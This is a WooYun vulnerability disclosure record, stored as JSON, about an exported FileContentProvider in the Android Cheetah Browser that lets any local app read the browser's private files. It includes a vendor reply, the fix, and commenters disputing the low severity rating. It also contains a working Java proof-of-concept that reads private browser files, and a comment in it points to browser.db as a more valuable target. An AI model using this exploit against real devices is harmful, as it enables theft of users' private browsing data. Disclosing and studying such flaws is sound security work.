{"id": 5293, "wybug_id": "wooyun-2013-047098", "wybug_title": "猎豹浏览器（Android版）任意私有文件数据可被本地第三方窃取漏洞", "wybug_corp": "金山网络", "wybug_author": "x3xtxt", "wybug_date": "2013-12-26 17:16", "wybug_open_date": "2014-03-26 17:17", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["手机应用", "安全", "手机软件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-26：\t细节向公众公开  简要描述： 猎豹浏览器的FileContentProvider组件可被任意第三方App调用，第三方App利用此组件可以读取浏览器中的任意私有数据。 详细说明：  组成猎豹浏览器的Content Providers中，com.ijinshan.browser.android.provider.FileContentProvider可以读取指定的文件，AndroidManifest.xml配置文件中没有指定android:exported的值，其android:exported取的是默认的值:true，导致任意第三方App都可以调用此接口，读取浏览器中的任意私有文件信息。   漏洞证明：  \npackage com.example.x3xtxt.demo.lb;import java.io.ByteArrayOutputStream;import java.io.InputStream;import android.net.Uri;import android.os.Bundle;import android.app.Activity;import android.view.Menu;import android.widget.Toast;public class MainActivity extends Activity {\t@Override\tprotected void onCreate(Bundle savedInstanceState) {\t\tsuper.onCreate(savedInstanceState);\t\tsetContentView(R.layout.activity_main);\t\t\t\t// 窃取目标文件路径，作为演示，就选小一点的文件：shared_prefs/bids.xml\t\t// 实际的攻击中，我们对databases目录下的记载有敏感信息的文件更感兴趣，比如：databases/browser.db之类的。\t\tString sensitive_file_path = \"content://com.ijinshan.htmlfileprovider/file:///data/data/com.ijinshan.browser/shared_prefs/bids.xml\";\t\tContentProviderFileOperations(sensitive_file_path);\t}\t@Override\tpublic boolean onCreateOptionsMenu(Menu menu) {\t\t// Inflate the menu; this adds items to the action bar if it is present.\t\tgetMenuInflater().inflate(R.menu.main, menu);\t\treturn true;\t}\t\tpublic void ContentProviderFileOperations(String filepath){\t\ttry{\t\t\tInputStream in = getContentResolver().openInputStream(Uri.parse(filepath));\t\t\tByteArrayOutputStream out = new ByteArrayOutputStream();\t\t\tbyte[] buffer = new byte[1024];\t\t\tint n = in.read(buffer);\t\t\twhile(n>0){\t\t\t\tout.write(buffer, 0, n);\t\t\t\tn = in.read(buffer);\t\t\t\tToast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show();\t\t\t}\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t}\t\tpublic void debugInfo(String msg){\t\tToast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show();\t}}\n   修复方案：  如果浏览器在功能上并不要求导出此接口给第三方App，则应当将其android:exported设置为false，请RD自行确定限制规则。   版权声明：转载请注明来源 x3xtxt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-12-27 20:29 厂商回复： 非常感谢，综合判断该漏洞的利用复杂度、影响范围与程度、被利用的空间综合判断为低危。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-26 17:43 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  貌似很牛逼的样子    \n     2013-12-27 20:50 |    \t\tx3xtxt \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:7        | 卧龙跃马终黄土，不如人生一场基。)\t\t \n  这分评的也太低了吧，毕竟对任意的私有文件都可以获得，难道你们的标准是除了能远程利用的都算低危?    \n     2013-12-28 10:23 |    \t\tdragonltx \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:21        | www.binvul.com)\t\t \n  @x3xtxt 金山对客户端漏洞一向如此，习惯就好    \n     2013-12-28 11:31 |    \t\tx3xtxt \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:7        | 卧龙跃马终黄土，不如人生一场基。)\t\t \n  @dragonltx 倒不是说要多争几个分，主要是考虑目前Android方面的漏洞还没有比较统一明确的标准，这样的评分会影响后续其他危害相当的漏洞的评分，另外，金山不是也搞安全吗?    \n     2013-12-28 15:37 |    \t\tdragonltx \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:21        | www.binvul.com)\t\t \n  @x3xtxt 金山处理漏洞的都是不懂客户端漏洞的，淡定吧    \n     2014-12-14 12:22 |    \t\tConer \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        )\t\t \n  这漏洞居然尼玛才给了5分，    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}